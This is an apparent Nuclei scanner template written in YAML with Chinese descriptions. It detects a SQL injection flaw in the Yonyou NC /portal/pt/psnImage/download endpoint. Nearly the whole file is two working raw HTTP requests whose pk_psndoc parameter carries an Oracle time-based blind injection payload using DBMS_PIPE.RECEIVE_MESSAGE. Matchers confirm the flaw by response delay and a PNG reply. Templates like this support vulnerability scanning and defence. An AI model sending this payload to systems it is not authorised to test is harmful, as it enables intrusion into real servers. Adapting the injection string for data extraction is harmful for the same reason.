id: poc-yaml-yongyou-psnImage-sqli
info:
  name: 用友NC接口/psnImage/download存在SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    用友NC接口的/psnImage/download页面存在SQL注入漏洞，可能允许攻击者通过注入恶意SQL语句获取敏感信息。

variables:
  t1: "{{rand_int(5,9)}}"
  t2: "{{to_number(t1)+3}}"
  t3: "{{rand_int(1,4)}}"
  t4: "{{to_number(t3)+3}}"

http:
  - raw:
      - |
        GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),{{t1}})%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
          - "contains(http_body, 'PNG')"
          - "contains(http_headers, 'image/png')"

  - raw:
      - |
        GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),{{t3}})%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= to_number(t3)"
          - "duration <= to_number(t4)"
          - "contains(http_body, 'PNG')"
          - "contains(http_headers, 'image/png')"
